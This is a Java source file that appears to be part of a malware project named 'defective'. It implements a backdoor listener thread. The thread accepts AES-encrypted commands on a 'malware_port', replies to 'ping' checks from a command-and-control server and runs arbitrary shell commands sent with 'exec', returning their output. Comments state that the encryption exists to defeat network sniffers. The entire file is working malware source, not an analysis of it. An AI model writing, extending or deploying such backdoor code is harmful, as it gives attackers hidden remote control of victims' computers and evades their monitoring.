package me.aaronakhtar.defective.threads;

import me.aaronakhtar.defective.Defective;
import me.aaronakhtar.defective.commands.Execute;
import me.aaronakhtar.defective.crypto.AES;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Listener extends Thread{

    /**
     We encrypt packet strings to insure
     software like wireshark and other network
     sniffers do not attempt to intercept the data
     without the secret key hardcoded in the software.
     */

    @Override
    public void run(){
        while(true) {
            try (ServerSocket serverSocket = new ServerSocket(Defective.malware_port)) {
                while (true) {
                    Socket socket = serverSocket.accept();
                    ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    String line = reader.readLine();
                    if (line != null) {
                        objectOutputStream.writeUTF(AES.encrypt(
                                check(AES.decrypt(line, Defective.encryptionKey)), Defective.encryptionKey)); //encrypts response then sends it
                        objectOutputStream.flush();
                    }
                    objectOutputStream.close();
                    reader.close();
                    socket.close();
                }
            } catch (IOException e) {
                if (Defective.underDevelopment) {
                    e.printStackTrace();
                }
            }
        }
    }

    private String check(String input){
        String returnString = "null";
        String i = input;
        if (input.split(" ").length > 1){
            i = input.split(" ")[0];
        }

        switch (i.toLowerCase()){

            /**The command and control will most likely utilize this to check if the host is running the malware / to check if the host is online*/
            case "ping":{
                returnString = "pong";
                break;
            }

            /**This will be used to send remote commands to the machine and it will return the output*/
            case "exec":{                                       // args: exec <command>
                String[] args = input.split(" ");
                if (args.length ==1){
                    returnString = "Specify a command: 'exec <command>'";
                    break;
                }
                StringBuilder stringBuilder = new StringBuilder();
                for (int x =1; x < args.length; x++){
                    stringBuilder.append(args[x]+ " ");
                }
                returnString = Execute.exec(stringBuilder.toString());
                break;
            }



        }
        return returnString; // returns "null" if the input does not match.
    }

}
